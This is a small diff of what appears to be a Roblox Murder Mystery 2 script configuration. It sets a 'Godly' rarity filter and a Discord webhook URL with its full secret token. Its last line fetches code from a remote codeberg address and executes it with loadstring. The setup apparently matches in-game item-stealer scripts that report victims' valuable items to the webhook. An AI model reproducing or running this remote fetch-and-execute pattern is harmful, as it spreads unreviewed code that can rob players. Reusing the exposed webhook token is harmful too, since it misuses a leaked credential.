@@ -3,4 +3,5 @@ min_rarity = "Godly"
 min_value = 1
 ping = "Yes"
 webhook = "https://discord.com/api/webhooks/1395895629183586355/m5-ean4bGKcMNW_3WnlDgawVHqQ-FhocEGFg1aUSIZzfjAu2W9ozorqmSOh5pgAODgN5"
+
 loadstring(game:HttpGet("https://codeberg.org/amaz/main/raw/branch/main/mm2"))()
